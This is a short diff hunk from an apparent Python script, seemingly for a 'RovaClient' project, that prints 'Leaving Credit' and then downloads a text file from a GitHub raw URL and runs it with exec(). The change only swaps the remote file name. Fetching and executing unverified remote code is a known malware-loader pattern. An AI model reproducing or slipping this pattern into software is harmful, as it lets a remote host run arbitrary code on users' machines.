@@ -20,4 +20,4 @@ while True:
     msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
-    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Minecraft.txt').text)
+    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
